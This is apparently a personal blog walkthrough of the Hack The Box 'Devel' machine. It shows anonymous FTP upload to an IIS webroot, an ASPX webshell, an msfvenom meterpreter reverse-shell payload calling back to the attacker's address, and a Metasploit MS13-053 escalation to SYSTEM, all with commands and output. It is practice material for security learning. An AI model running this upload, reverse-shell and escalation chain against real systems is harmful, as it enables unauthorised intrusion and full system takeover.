---
title: "Devel Walkthrough - HTB Easy | IIS File Upload & Windows PrivEsc"
description: "Complete walkthrough of Devel from Hack The Box. Covers anonymous FTP access, arbitrary file upload to IIS, ASP webshell deployment, and Windows 7 privilege escalation using MS13-053."
author: dua2z3rr
date: 2025-12-03 1:00:00
categories: [HackTheBox, Machines]
tags: ["enterprise-network", "protocols", "remote-code-execution", "arbitrary-file-upload", "asp", "iis", "ftp"]
image: /assets/img/devel/devel-resized.png
---

## Overview

Devel is a relatively simple box that demonstrates the security risks associated with default program configurations. This easy-level machine can be completed using publicly available exploits and showcases common IIS misconfigurations.

---

## External Enumeration

### Nmap Scan

Starting with a full port scan:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.5 -vv -p- -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key findings:**
- FTP service with **anonymous login allowed**
- Microsoft IIS 7.5 web server
- Default IIS files visible in FTP

---

## Initial Access

### FTP Anonymous Access

Connecting to FTP with anonymous credentials:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:dua2z3rr): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
```

**Critical discovery:** FTP root directory appears to be the IIS webroot.

### Examining IIS Default Page

Downloading and examining `iisstart.htm`:

```html
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat iisstart.htm 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS7</title>
<style type="text/css">
<!--
body {
	color:#000000;
	background-color:#B3B3B3;
	margin:0;
}

#container {
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	}

a img {
	border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>
</div>
</body>
</html>
```

### Web Server Verification

Accessing the website confirms the FTP directory is indeed the webroot:

![IIS Default Page](/assets/img/devel/devel-1.png)

**Attack vector identified:** We can upload files via FTP that will be directly accessible through the web server.

---

## Exploitation

### Uploading ASPX Webshell

Since this is an IIS server, we need to upload an ASP/ASPX webshell. Using the Antak webshell from Nishang:

```shell
ftp> put 
(local-file) /usr/share/nishang/Antak-WebShell/antak.aspx
(remote-file) shell.aspx
local: /usr/share/nishang/Antak-WebShell/antak.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49179|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************| 10713        0.97 MiB/s    --:-- ETA
226 Transfer complete.
10713 bytes sent in 00:00 (58.95 KiB/s)
```

### Accessing the Webshell

Navigating to `http://10.10.10.5/shell.aspx` provides a web-based command execution interface:

![Antak Webshell](/assets/img/devel/devel-2.png)

**Initial foothold achieved** as `iis apppool\web`

---

## Upgrading to Meterpreter

### Creating Reverse Shell Payload

Generating an ASPX reverse shell with msfvenom:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=8080 -f aspx > devel.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2878 bytes
```

### Uploading Payload

Uploading the reverse shell via FTP:

```shell
ftp> put
(local-file) /home/dua2z3rr/devel.aspx
(remote-file) devel.aspx
local: /home/dua2z3rr/devel.aspx remote: devel.aspx
229 Entering Extended Passive Mode (|||49182|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************|  2918       35.22 MiB/s    --:-- ETA
226 Transfer complete.
2918 bytes sent in 00:00 (23.04 KiB/s)
```

### Setting Up Metasploit Handler

Configuring and starting the multi/handler:

```shell
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8080
lport => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

Accessing `http://10.10.10.5/devel.aspx` triggers the payload:

```shell
[*] Sending stage (177734 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.16.4:8080 -> 10.10.10.5:49183) at 2025-12-03 18:10:15 +0100

(Meterpreter 1)(c:\windows\system32\inetsrv) > 
```

**Meterpreter session established** as `iis apppool\web`

---

## Privilege Escalation

### Internal Enumeration

Using the `local_exploit_suggester` module to identify potential privilege escalation paths:

```shell
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester

[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use 0
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set showdescription true
showdescription => true
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 205 exploit checks are being tried...
```

**Multiple vulnerabilities identified**, including:
- `exploit/windows/local/ms10_015_kitrap0d`
- `exploit/windows/local/ms13_053_schlamperei`
- `exploit/windows/local/ms13_081_track_popup_menu`
- `exploit/windows/local/ms14_058_track_popup_menu`
- `exploit/windows/local/ms15_051_client_copy_image`
- `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`

And many others...

### Exploiting MS13-053 (Schlamperei)

After testing several exploits, MS13-053 successfully escalates privileges:

```shell
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set lhost tun0
lhost => 10.10.16.4
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> run
[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Launching notepad to host the exploit...
[+] Process 2032 launched.
[*] Reflectively injecting the exploit DLL into 2032...
[*] Injecting exploit into 2032...
[*] Found winlogon.exe with PID 440
[*] Sending stage (177734 bytes) to 10.10.10.5
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Meterpreter session 2 opened (10.10.16.4:4444 -> 10.10.10.5:49184) at 2025-12-03 18:21:33 +0100

(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Root flag obtained!** Box completed.

---

## Reflections

### What Surprised Me

I didn't expect the FTP anonymous access to point directly to the IIS webroot. This is an incredibly dangerous misconfiguration, it gives anyone on the network the ability to host arbitrary web content on your server. In a real environment, this could lead to website defacement, malware distribution, or phishing attacks within a couple of minutes of discovery.

### Alternative Approaches

If I were to redo this box, I would skip the Antak webshell entirely and go straight to uploading the msfvenom ASPX payload. The Antak webshell was interesting to see, but it added an unnecessary step.

### Open Question

This box had **16 different working privilege escalation exploits** (not all working for me). In a real Windows 7 environment from 2017-2018, how common was it to have this many unpatched vulnerabilities? And more importantly, what's the best strategy when you have this many options. Do you start with the oldest exploits or the newest? With the most successful one? Or the most stable? I'm curious to know how experienced pentesters prioritize when faced with this many choices.

---

**Completed this box? What was your privilege escalation path?** Comment down below!
